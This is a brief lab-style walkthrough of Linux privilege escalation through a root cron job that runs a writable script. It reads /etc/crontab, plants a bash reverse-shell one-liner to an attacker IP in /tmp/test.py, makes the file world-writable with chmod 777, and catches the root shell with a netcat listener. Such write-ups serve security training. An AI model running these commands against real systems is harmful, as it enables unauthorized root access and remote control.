# 🔐 Privilege Escalation: Cron Job

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
---
To know the job we can exploit it use command :
```bash
cat /etc/crontab
```

![img](screenshots/crontab/crontab_command.png)

we find many job can exploit it 
* **/home/karen/backup.sh*
* **/tmp/test.py**

we will work in "/tmp/test.py"

go to tmp by " cd /tmp "
then search file with name test.py if not find, create one with same name
now write exploit code :
```bash
#!/bin/bash
bash -i >& /dev/tcp/<ip_for_your_devie>/port 0>&1
```

![img](screenshots/crontab/nano_file.png)

change mode for this file

```bash
chmod 777 test.py
```

![img](screenshots/crontab/chmod.png)

then from your machine use net cat to connect the victim machine
```bash
nc -nlvp port
```

![img](screenshots/crontab/get_root_crons.png)
